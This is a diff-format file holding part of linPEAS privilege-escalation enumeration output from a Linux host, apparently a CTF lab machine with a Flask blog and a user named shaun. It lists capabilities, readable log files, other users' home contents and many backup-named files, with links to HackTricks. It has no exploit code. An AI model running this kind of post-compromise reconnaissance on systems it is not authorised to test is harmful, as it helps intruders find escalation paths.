+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+
+[+] Users with capabilities
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
+
+[+] Files with ACLs
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls
+files with acls in searched folders Not Found
+
+[+] .sh files in path
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path
+/usr/bin/amuFormat.sh
+/usr/bin/gettext.sh
+
+[+] Unexpected folders in root
+/lost+found
+
+[+] Files (scripts) in /etc/profile.d/
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files
+total 44
+drwxr-xr-x   2 root root  4096 Jul 20 22:30 .
+drwxr-xr-x 132 root root 12288 Sep 19 16:54 ..
+-rw-r--r--   1 root root    96 Dez  5  2019 01-locale-fix.sh
+-rw-r--r--   1 root root   825 Apr 10  2020 apps-bin-path.sh
+-rw-r--r--   1 root root   729 Feb  2  2020 bash_completion.sh
+-rw-r--r--   1 root root  1003 Aug 13  2019 cedilla-portuguese.sh
+-rw-r--r--   1 root root  1368 Apr  9  2020 vte-2.91.sh
+-rw-r--r--   1 root root   966 Apr  9  2020 vte.csh
+-rw-r--r--   1 root root   954 Mär 26  2020 xdg_dirs_desktop_session.sh
+
+[+] Permissions in init, init.d, systemd, and rc.d
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d
+
+[+] Hashes inside passwd file? ........... No
+[+] Writable passwd file? ................ No
+[+] Credentials in fstab/mtab? ........... No
+[+] Can I read shadow files? ............. No
+[+] Can I read opasswd file? ............. No
+[+] Can I write in network-scripts? ...... No
+[+] Can I read root folder? .............. No
+
+[+] Searching root files in home dirs (limit 30)
+/home
+/home/web/blog/flaskblog/static/profile_pics/default.gif
+/home/shaun/.bash_history
+
+[+] Searching folders owned by me containing others files on it
+
+[+] Readable files belonging to root and readable by me but not world readable
+-rw-r----- 1 root adm 92 Sep 28 12:12 /var/log/cups/error_log.1
+-rw-r----- 1 root adm 4512 Sep 28 15:07 /var/log/cups/access_log.1
+-rw-r----- 1 root adm 202 Sep 17 00:00 /var/log/cups/access_log.7.gz
+-rw-r----- 1 root adm 256 Sep 23 10:46 /var/log/cups/access_log.3.gz
+-rw-r----- 1 root adm 194 Nov 27 08:29 /var/log/cups/error_log
+-rw-r----- 1 root adm 267 Sep 23 15:42 /var/log/cups/access_log.2.gz
+-rw-r----- 1 root adm 118 Sep 15 11:56 /var/log/cups/error_log.2.gz
+-rw-r----- 1 root adm 109 Aug 13 08:13 /var/log/cups/error_log.3.gz
+-rw-r----- 1 root adm 224 Nov 27 07:35 /var/log/cups/access_log
+-rw-r----- 1 root adm 204 Sep 18 00:00 /var/log/cups/access_log.6.gz
+-rw-r----- 1 root adm 190 Sep 19 00:00 /var/log/cups/access_log.5.gz
+-rw-r----- 1 root adm 219 Sep 22 10:40 /var/log/cups/access_log.4.gz
+-rw-r----- 1 root adm 476 Sep  7 17:46 /var/log/apache2/error.log.10.gz
+-rw-r----- 1 root adm 460 Sep 15 00:00 /var/log/apache2/error.log.9.gz
+-rw-r----- 1 root adm 270 Aug 18 12:48 /var/log/apache2/access.log.11.gz
+-rw-r----- 1 root adm 588 Nov 27 08:28 /var/log/apache2/error.log
+-rw-r----- 1 root adm 21578 Sep 17 16:23 /var/log/apache2/backup
+-rw-r----- 1 root adm 1493 Sep 23 15:20 /var/log/apache2/access.log.2.gz
+-rw-r----- 1 root adm 424 Sep 18 00:00 /var/log/apache2/error.log.6.gz
+-rw-r----- 1 root adm 3551 Sep 28 15:07 /var/log/apache2/error.log.1
+-rw-r----- 1 root adm 6626 Sep 28 15:02 /var/log/apache2/access.log.1
+-rw-r----- 1 root adm 230 Aug 21 13:07 /var/log/apache2/error.log.14.gz
+-rw-r----- 1 root adm 846 Sep 22 13:03 /var/log/apache2/error.log.3.gz
+-rw-r----- 1 root adm 352 Sep 19 00:00 /var/log/apache2/error.log.5.gz
+-rw-r----- 1 root adm 38885 Nov 27 08:28 /var/log/apache2/access.log
+-rw-r----- 1 root adm 384 Sep 14 10:07 /var/log/apache2/access.log.6.gz
+-rw-r----- 1 root adm 3018 Sep  7 17:24 /var/log/apache2/access.log.7.gz
+-rw-r----- 1 root adm 1338 Sep  6 22:46 /var/log/apache2/access.log.8.gz
+-rw-r----- 1 root adm 428 Sep 17 00:00 /var/log/apache2/error.log.7.gz
+-rw-r----- 1 root adm 1266 Sep  5 11:58 /var/log/apache2/access.log.9.gz
+-rw-r----- 1 root adm 655 Sep 22 10:40 /var/log/apache2/error.log.4.gz
+-rw-r----- 1 root adm 629 Sep 16 00:00 /var/log/apache2/error.log.8.gz
+-rw-r----- 1 root adm 3951 Sep 22 12:58 /var/log/apache2/access.log.3.gz
+-rw-r----- 1 root adm 1341 Sep 19 19:17 /var/log/apache2/access.log.4.gz
+-rw-r----- 1 root adm 1092 Sep 23 15:42 /var/log/apache2/error.log.2.gz
+-rw-r----- 1 root adm 341 Sep  5 00:00 /var/log/apache2/error.log.13.gz
+-rw-r----- 1 root adm 680 Sep  5 11:58 /var/log/apache2/error.log.12.gz
+-rw-r----- 1 root adm 323 Aug 21 13:00 /var/log/apache2/access.log.10.gz
+-rw-r----- 1 root adm 537 Sep  6 22:47 /var/log/apache2/error.log.11.gz
+-rw-r----- 1 root adm 664054 Sep 15 14:27 /var/log/apache2/access.log.5.gz
+-rw-r----- 1 root adm 320 Sep  6 16:29 /var/log/apt/term.log.1.gz
+-rw-r----- 1 root adm 2932 Aug 13 09:16 /var/log/apt/term.log.2.gz
+-rw-r----- 1 root adm 0 Sep  7 12:13 /var/log/apt/term.log
+
+[+] Modified interesting files in the last 5mins (limit 100)
+/home/web/.gnupg/trustdb.gpg
+/home/web/.gnupg/pubring.kbx
+/var/log/auth.log
+/var/log/syslog
+/var/log/cups/error_log
+/var/log/apache2/error.log
+/var/log/apache2/access.log
+/var/log/journal/62307f5876ce4bdeb1a4be33bebfb978/system.journal
+/var/log/journal/62307f5876ce4bdeb1a4be33bebfb978/user-1001.journal
+/var/log/kern.log
+/tmp/linpeas.txt
+
+[+] Writable log files (logrotten) (limit 100)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation
+logrotate 3.14.0
+
+    Default mail command:       /usr/bin/mail
+    Default compress command:   /bin/gzip
+    Default uncompress command: /bin/gunzip
+    Default compress extension: .gz
+    Default state file path:    /var/lib/logrotate/status
+    ACL support:                yes
+    SELinux support:            yes
+
+[+] Files inside /home/web (limit 20)
+total 52
+drwxr-xr-x 7 web  web  4096 Nov 27 08:29 .
+drwxr-xr-x 4 root root 4096 Sep 19 16:54 ..
+lrwxrwxrwx 1 web  web     9 Jul 26 14:24 .bash_history -> /dev/null
+-rw-r--r-- 1 web  web   220 Jul 20 22:34 .bash_logout
+-rw-r--r-- 1 web  web  3771 Jul 20 22:34 .bashrc
+drwxr-xr-x 3 web  web  4096 Sep 22 11:29 blog
+-rwxrwxr-x 1 web  web   135 Jul 26 14:12 blog.sh
+drwxrwxr-x 5 web  web  4096 Jul 27 20:45 .cache
+drwxr-xr-x 4 web  web  4096 Jul 27 20:45 .config
+drwx------ 2 web  web  4096 Nov 27 08:29 .gnupg
+drwxrwxr-x 5 web  web  4096 Jul 26 12:46 .local
+-rw-r--r-- 1 web  web   807 Jul 20 22:34 .profile
+-rw------- 1 web  web   177 Jul 27 20:45 .python_history
+-rw-rw-r-- 1 web  web    66 Jul 26 12:44 .selected_editor
+
+[+] Files inside others home (limit 20)
+/home/shaun/.bash_logout
+/home/shaun/.cache/motd.legal-displayed
+/home/shaun/.cache/gstreamer-1.0/registry.x86_64.bin
+/home/shaun/.cache/tracker/meta.db-wal
+/home/shaun/.cache/tracker/first-index.txt
+/home/shaun/.cache/tracker/parser-version.txt
+/home/shaun/.cache/tracker/no-need-mtime-check.txt
+/home/shaun/.cache/tracker/last-crawl.txt
+/home/shaun/.cache/tracker/db-locale.txt
+/home/shaun/.cache/tracker/meta.db
+/home/shaun/.cache/tracker/locale-for-miner-apps.txt
+/home/shaun/.cache/tracker/ontologies.gvdb
+/home/shaun/.cache/tracker/db-version.txt
+/home/shaun/.cache/tracker/meta.db-shm
+/home/shaun/.profile
+/home/shaun/.selected_editor
+/home/shaun/user.txt
+/home/shaun/.bashrc
+
+[+] Searching installed mail applications
+exim.conf
+exim-4.90-6
+sendmail
+exim-4.90-6
+sendmail
+
+[+] Mails (limit 50)
+
+[+] Backup files?
+-rw-r--r-- 1 root root 1208 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Dark-Maia/16x16/places/folder-backup.svg
+-rw-r--r-- 1 root root 1208 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Light-Maia/16x16/places/folder-backup.svg
+-rw-r--r-- 1 root root 1208 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/16x16/places/folder-backup.svg
+-rw-r--r-- 1 root root 1023 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/22x22/places/folder-black-backup.svg
+-rw-r--r-- 1 root root 1023 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/22x22/places/folder-blue-backup.svg
+-rw-r--r-- 1 root root 1023 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/22x22/places/folder-bluegrey-backup.svg
+-rw-r--r-- 1 root root 1023 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/22x22/places/folder-brown-backup.svg
+-rw-r--r-- 1 root root 1032 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/22x22/places/folder-custom-backup.svg
+-rw-r--r-- 1 root root 1023 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/22x22/places/folder-cyan-backup.svg
+-rw-r--r-- 1 root root 1023 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/22x22/places/folder-deeporange-backup.svg
+-rw-r--r-- 1 root root 1023 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/22x22/places/folder-green-backup.svg
+-rw-r--r-- 1 root root 1023 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/22x22/places/folder-grey-backup.svg
+-rw-r--r-- 1 root root 1023 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/22x22/places/folder-indigo-backup.svg
+-rw-r--r-- 1 root root 1023 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/22x22/places/folder-magenta-backup.svg
+-rw-r--r-- 1 root root 1023 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/22x22/places/folder-nordic-backup.svg
+-rw-r--r-- 1 root root 1023 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/22x22/places/folder-orange-backup.svg
+-rw-r--r-- 1 root root 1023 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/22x22/places/folder-pink-backup.svg
+-rw-r--r-- 1 root root 1023 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/22x22/places/folder-red-backup.svg
+-rw-r--r-- 1 root root 1023 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/22x22/places/folder-teal-backup.svg
+-rw-r--r-- 1 root root 1023 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/22x22/places/folder-violet-backup.svg
+-rw-r--r-- 1 root root 1023 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/22x22/places/folder-white-backup.svg
+-rw-r--r-- 1 root root 1023 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/22x22/places/folder-yellow-backup.svg
+-rw-r--r-- 1 root root 1065 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/24x24/places/folder-black-backup.svg
+-rw-r--r-- 1 root root 1065 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/24x24/places/folder-blue-backup.svg
+-rw-r--r-- 1 root root 1065 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/24x24/places/folder-bluegrey-backup.svg
+-rw-r--r-- 1 root root 1065 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/24x24/places/folder-brown-backup.svg
+-rw-r--r-- 1 root root 1074 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/24x24/places/folder-custom-backup.svg
+-rw-r--r-- 1 root root 1065 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/24x24/places/folder-cyan-backup.svg
+-rw-r--r-- 1 root root 1065 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/24x24/places/folder-deeporange-backup.svg
+-rw-r--r-- 1 root root 1065 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/24x24/places/folder-green-backup.svg
+-rw-r--r-- 1 root root 1065 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/24x24/places/folder-grey-backup.svg
+-rw-r--r-- 1 root root 1065 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/24x24/places/folder-indigo-backup.svg
+-rw-r--r-- 1 root root 1065 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/24x24/places/folder-magenta-backup.svg
+-rw-r--r-- 1 root root 1065 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/24x24/places/folder-nordic-backup.svg
+-rw-r--r-- 1 root root 1065 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/24x24/places/folder-orange-backup.svg
+-rw-r--r-- 1 root root 1065 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/24x24/places/folder-pink-backup.svg
+-rw-r--r-- 1 root root 1065 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/24x24/places/folder-red-backup.svg
+-rw-r--r-- 1 root root 1065 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/24x24/places/folder-teal-backup.svg
+-rw-r--r-- 1 root root 1065 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/24x24/places/folder-violet-backup.svg
+-rw-r--r-- 1 root root 1065 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/24x24/places/folder-white-backup.svg
+-rw-r--r-- 1 root root 1065 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/24x24/places/folder-yellow-backup.svg
+-rw-r--r-- 1 root root 1829 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/32x32/places/folder-black-backup.svg
+-rw-r--r-- 1 root root 1829 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/32x32/places/folder-blue-backup.svg
+-rw-r--r-- 1 root root 1829 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/32x32/places/folder-bluegrey-backup.svg
+-rw-r--r-- 1 root root 1829 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/32x32/places/folder-brown-backup.svg
+-rw-r--r-- 1 root root 1838 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/32x32/places/folder-custom-backup.svg
+-rw-r--r-- 1 root root 1829 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/32x32/places/folder-cyan-backup.svg
+-rw-r--r-- 1 root root 1829 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/32x32/places/folder-deeporange-backup.svg
+-rw-r--r-- 1 root root 1829 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/32x32/places/folder-green-backup.svg
+-rw-r--r-- 1 root root 1829 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/32x32/places/folder-grey-backup.svg
+-rw-r--r-- 1 root root 1829 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/32x32/places/folder-indigo-backup.svg
+-rw-r--r-- 1 root root 1829 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/32x32/places/folder-magenta-backup.svg
+-rw-r--r-- 1 root root 1829 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/32x32/places/folder-nordic-backup.svg
+-rw-r--r-- 1 root root 1829 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/32x32/places/folder-orange-backup.svg
+-rw-r--r-- 1 root root 1829 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/32x32/places/folder-pink-backup.svg
+-rw-r--r-- 1 root root 1829 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/32x32/places/folder-red-backup.svg
+-rw-r--r-- 1 root root 1829 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/32x32/places/folder-teal-backup.svg
+-rw-r--r-- 1 root root 1829 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/32x32/places/folder-violet-backup.svg
+-rw-r--r-- 1 root root 1829 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/32x32/places/folder-white-backup.svg
+-rw-r--r-- 1 root root 1829 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/32x32/places/folder-yellow-backup.svg
+-rw-r--r-- 1 root root 1673 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/48x48/places/folder-black-backup.svg
+-rw-r--r-- 1 root root 1673 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/48x48/places/folder-blue-backup.svg
+-rw-r--r-- 1 root root 1673 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/48x48/places/folder-bluegrey-backup.svg
+-rw-r--r-- 1 root root 1673 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/48x48/places/folder-brown-backup.svg
+-rw-r--r-- 1 root root 1682 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/48x48/places/folder-custom-backup.svg
+-rw-r--r-- 1 root root 1673 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/48x48/places/folder-cyan-backup.svg
+-rw-r--r-- 1 root root 1673 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/48x48/places/folder-deeporange-backup.svg
+-rw-r--r-- 1 root root 1673 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/48x48/places/folder-green-backup.svg
+-rw-r--r-- 1 root root 1673 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/48x48/places/folder-grey-backup.svg
+-rw-r--r-- 1 root root 1673 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/48x48/places/folder-indigo-backup.svg
+-rw-r--r-- 1 root root 1673 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/48x48/places/folder-magenta-backup.svg
+-rw-r--r-- 1 root root 1673 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/48x48/places/folder-nordic-backup.svg
+-rw-r--r-- 1 root root 1673 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/48x48/places/folder-orange-backup.svg
+-rw-r--r-- 1 root root 1673 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/48x48/places/folder-pink-backup.svg
+-rw-r--r-- 1 root root 1673 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/48x48/places/folder-red-backup.svg
+-rw-r--r-- 1 root root 1673 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/48x48/places/folder-teal-backup.svg
+-rw-r--r-- 1 root root 1673 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/48x48/places/folder-violet-backup.svg
+-rw-r--r-- 1 root root 1673 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/48x48/places/folder-white-backup.svg
+-rw-r--r-- 1 root root 1673 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/48x48/places/folder-yellow-backup.svg
+-rw-r--r-- 1 root root 1811 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/64x64/places/folder-black-backup.svg
+-rw-r--r-- 1 root root 1811 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/64x64/places/folder-blue-backup.svg
+-rw-r--r-- 1 root root 1811 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/64x64/places/folder-bluegrey-backup.svg
+-rw-r--r-- 1 root root 1811 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/64x64/places/folder-brown-backup.svg
+-rw-r--r-- 1 root root 1820 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/64x64/places/folder-custom-backup.svg
+-rw-r--r-- 1 root root 1811 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/64x64/places/folder-cyan-backup.svg
+-rw-r--r-- 1 root root 1811 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/64x64/places/folder-deeporange-backup.svg
+-rw-r--r-- 1 root root 1811 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/64x64/places/folder-green-backup.svg
+-rw-r--r-- 1 root root 1811 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/64x64/places/folder-grey-backup.svg
+-rw-r--r-- 1 root root 1811 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/64x64/places/folder-indigo-backup.svg
+-rw-r--r-- 1 root root 1811 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/64x64/places/folder-magenta-backup.svg
+-rw-r--r-- 1 root root 1811 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/64x64/places/folder-nordic-backup.svg
+-rw-r--r-- 1 root root 1811 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/64x64/places/folder-orange-backup.svg
+-rw-r--r-- 1 root root 1811 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/64x64/places/folder-pink-backup.svg
+-rw-r--r-- 1 root root 1811 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/64x64/places/folder-red-backup.svg
+-rw-r--r-- 1 root root 1811 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/64x64/places/folder-teal-backup.svg
+-rw-r--r-- 1 root root 1811 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/64x64/places/folder-violet-backup.svg
+-rw-r--r-- 1 root root 1811 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/64x64/places/folder-white-backup.svg
+-rw-r--r-- 1 root root 1811 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Papirus-Maia/64x64/places/folder-yellow-backup.svg
+-rw-r--r-- 1 root root 760 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Yaru/16x16/apps/backups-app.png
+-rw-r--r-- 1 root root 1533 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Yaru/16x16@2x/apps/backups-app.png
+-rw-r--r-- 1 root root 1029 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Yaru/24x24/apps/backups-app.png
+-rw-r--r-- 1 root root 2336 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Yaru/24x24@2x/apps/backups-app.png
+-rw-r--r-- 1 root root 14450 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Yaru/256x256/apps/backups-app.png
+-rw-r--r-- 1 root root 31911 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Yaru/256x256@2x/apps/backups-app.png
+-rw-r--r-- 1 root root 1390 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Yaru/32x32/apps/backups-app.png
+-rw-r--r-- 1 root root 3052 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Yaru/32x32@2x/apps/backups-app.png
+-rw-r--r-- 1 root root 2118 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Yaru/48x48/apps/backups-app.png
+-rw-r--r-- 1 root root 4795 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Yaru/48x48@2x/apps/backups-app.png
+-rw-r--r-- 1 root root 5635 Apr 20  2020 /snap/gtk-common-themes/1506/share/icons/Yaru/scalable/apps/backups-app-symbolic.svg
+-rw-r--r-- 1 root root 8729 Jun 22 22:59 /usr/lib/modules/5.4.0-40-generic/kernel/drivers/power/supply/wm831x_backup.ko
+-rw-r--r-- 1 root root 8161 Jun 22 22:59 /usr/lib/modules/5.4.0-40-generic/kernel/drivers/net/team/team_mode_activebackup.ko
+-rw-r--r-- 1 root root 8729 Jul 10 01:50 /usr/lib/modules/5.4.0-42-generic/kernel/drivers/power/supply/wm831x_backup.ko
+-rw-r--r-- 1 root root 8161 Jul 10 01:50 /usr/lib/modules/5.4.0-42-generic/kernel/drivers/net/team/team_mode_activebackup.ko
+-rw-r--r-- 1 root root 44048 Jun 22 08:40 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
+-rw-r--r-- 1 root root 0 Jun 22 22:59 /usr/src/linux-headers-5.4.0-40-generic/include/config/net/team/mode/activebackup.h
+-rw-r--r-- 1 root root 0 Jun 22 22:59 /usr/src/linux-headers-5.4.0-40-generic/include/config/wm831x/backup.h
+-rw-r--r-- 1 root root 237784 Jun 22 22:59 /usr/src/linux-headers-5.4.0-40-generic/.config.old
+-rwxr-xr-x 1 root root 1086 Nov 25  2019 /usr/src/linux-headers-5.4.0-42/tools/testing/selftests/net/tcp_fastopen_backup_key.sh
+-rw-r--r-- 1 root root 0 Jul 10 01:50 /usr/src/linux-headers-5.4.0-42-generic/include/config/net/team/mode/activebackup.h
+-rw-r--r-- 1 root root 0 Jul 10 01:50 /usr/src/linux-headers-5.4.0-42-generic/include/config/wm831x/backup.h
+-rw-r--r-- 1 root root 237784 Jul 10 01:50 /usr/src/linux-headers-5.4.0-42-generic/.config.old
+-rwxr-xr-x 1 root root 1086 Nov 25  2019 /usr/src/linux-headers-5.4.0-40/tools/testing/selftests/net/tcp_fastopen_backup_key.sh
+-rw-r--r-- 1 root root 5635 Mai  8  2020 /usr/share/icons/Yaru/scalable/apps/backups-app-symbolic.svg
+-rw-r--r-- 1 root root 8085 Mai  8  2020 /usr/share/icons/Yaru/256x256/apps/backups-app.png
+-rw-r--r-- 1 root root 2531 Mai  8  2020 /usr/share/icons/Yaru/48x48@2x/apps/backups-app.png
+-rw-r--r-- 1 root root 447 Mai  8  2020 /usr/share/icons/Yaru/16x16/apps/backups-app.png
+-rw-r--r-- 1 root root 1486 Mai  8  2020 /usr/share/icons/Yaru/24x24@2x/apps/backups-app.png
+-rw-r--r-- 1 root root 881 Mai  8  2020 /usr/share/icons/Yaru/32x32/apps/backups-app.png
+-rw-r--r-- 1 root root 932 Mai  8  2020 /usr/share/icons/Yaru/16x16@2x/apps/backups-app.png
+-rw-r--r-- 1 root root 635 Mai  8  2020 /usr/share/icons/Yaru/24x24/apps/backups-app.png
+-rw-r--r-- 1 root root 1290 Mai  8  2020 /usr/share/icons/Yaru/48x48/apps/backups-app.png
+-rw-r--r-- 1 root root 1697 Mai  8  2020 /usr/share/icons/Yaru/32x32@2x/apps/backups-app.png
+-rw-r--r-- 1 root root 18529 Mai  8  2020 /usr/share/icons/Yaru/256x256@2x/apps/backups-app.png
+-rw-r--r-- 1 root root 12406 Jul 26 19:30 /usr/share/info/dir.old
+-rw-r--r-- 1 root root 1581 Mär 10  2020 /usr/share/help/C/seahorse/misc-key-backup.page
+-rw-r--r-- 1 root root 1815 Jul  4 22:17 /usr/share/help/C/gnome-help/backup-check.page
+-rw-r--r-- 1 root root 3396 Jul  4 22:17 /usr/share/help/C/gnome-help/backup-thinkabout.page
+-rw-r--r-- 1 root root 1999 Jul  4 22:17 /usr/share/help/C/gnome-help/backup-frequency.page
+-rw-r--r-- 1 root root 1320 Jul  4 22:17 /usr/share/help/C/gnome-help/backup-restore.page
+-rw-r--r-- 1 root root 1262 Jul  4 22:17 /usr/share/help/C/gnome-help/backup-why.page
+-rw-r--r-- 1 root root 2356 Jul  4 22:17 /usr/share/help/C/gnome-help/backup-how.page
+-rw-r--r-- 1 root root 2268 Jul  4 22:17 /usr/share/help/C/gnome-help/backup-where.page
+-rw-r--r-- 1 root root 2505 Jul  4 22:17 /usr/share/help/C/gnome-help/backup-what.page
+-rw-r--r-- 1 root root 392817 Feb  9  2020 /usr/share/doc/manpages/Changes.old.gz
+-rwxr-xr-x 1 root root 1513 Jan 25  2020 /usr/share/doc/libipc-system-simple-perl/examples/rsync-backup.pl
+-rw-r--r-- 1 root root 7867 Jul 16  1996 /usr/share/doc/telnet/README.old.gz
+-rw-r--r-- 1 root root 1059 Mär 27  2020 /usr/share/help-langpack/en_AU/deja-dup/backup-auto.page
+-rw-r--r-- 1 root root 840 Mär 27  2020 /usr/share/help-langpack/en_AU/deja-dup/backup-first.page
+-rw-r--r-- 1 root root 2544 Apr 16  2020 /usr/share/help-langpack/en_GB/evolution/backup-restore.page
